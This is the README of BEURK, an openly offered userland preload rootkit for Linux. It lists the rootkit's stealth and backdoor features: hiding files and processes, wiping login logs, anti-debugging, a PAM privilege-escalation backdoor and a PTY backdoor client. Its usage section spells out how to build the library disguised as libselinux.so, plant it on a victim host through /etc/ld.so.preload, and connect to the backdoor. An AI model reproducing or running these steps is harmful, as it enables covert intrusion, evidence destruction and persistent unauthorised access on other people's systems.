BEURK
=====
[Wiki] | [API Documentation] | [Getting Started] | [Contributing]

[![Travis Build](https://travis-ci.org/unix-thrust/beurk.svg?branch=master)](https://travis-ci.org/unix-thrust/beurk)
[![Ready Issues](https://badge.waffle.io/unix-thrust/beurk.svg?label=Ready&title=Ready-Issues)](https://waffle.io/unix-thrust/beurk)
[![Coverage Status](https://img.shields.io/coveralls/unix-thrust/beurk.svg)](https://coveralls.io/r/unix-thrust/beurk)
[![Coverity Scan Build](https://img.shields.io/coverity/scan/4866.svg)](https://scan.coverity.com/projects/4866)
[![Jenkins Build](http://ci.zgun-family.eu/job/BEURK/badge/icon)](http://ci.zgun-family.eu/job/BEURK/)

**BEURK** is an userland [preload rootkit] for GNU/Linux, heavily focused
around anti-debugging and anti-detection.

> _**S'ils savaient, ils vomiraient ...**_
>
> *- The core team -*

[![Join the chat at https://gitter.im/unix-thrust/beurk](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/unix-thrust/beurk)

-------------------------------------------------------------------------------

### Features ###
- Hide attacker files and directories
- Realtime log cleanup (on [utmp/wtmp])
- Anti process and login detection
- [ptrace(2)] hooking for anti-debugging
- [libpcap] hooking undermines local sniffers
- Bypass unhide, lsof, ps, ldd, netstat analysis
- PAM backdoor for *local privilege escalation*
- Furtive PTY backdoor client

### Usage ###
* **Compile**
```sh
    git clone https://github.com/unix-thrust/beurk.git
    cd beurk
    ./builder --arch=x64 # build an evil hooking library

```
* **Install**
```sh
    scp libselinux.so root@victim.com:/lib/
    ssh root@victim.com 'echo /lib/libselinux.so >> /etc/ld.so.preload'
```
* **Enjoy !**
```sh
    ./client victim_ip:port # connect with furtive backdoor
```

-------------------------------------------------------------------------------

[![Throughput Graph](https://graphs.waffle.io/unix-thrust/beurk/throughput.svg)](https://waffle.io/unix-thrust/beurk/metrics)

* _**BEURK v 1.0 is in active development,**_
_**please checkout current [development branch].**_

> NOTE: **BEURK** is a recursive acronym for
> **B**EURK **E**xperimental **U**nix **R**oot **K**it

-------------------------------------------------------------------------------

[Wiki]: https://github.com/unix-thrust/beurk/wiki
[API Documentation]: https://github.com/unix-thrust/beurk/wiki/API-Documentation
[Getting Started]: https://github.com/unix-thrust/beurk/wiki/Getting-Started
[Contributing]: https://github.com/unix-thrust/beurk/blob/master/CONTRIBUTING.md

[preload rootkit]: http://volatility-labs.blogspot.fr/2012/09/movp-24-analyzing-jynx-rootkit-and.html
[utmp/wtmp]: http://man7.org/linux/man-pages/man5/utmp.5.html
[ptrace(2)]: http://man7.org/linux/man-pages/man2/ptrace.2.html
[libpcap]: http://en.wikipedia.org/wiki/Pcap#libpcap
[development branch]: https://github.com/unix-thrust/beurk/tree/dev
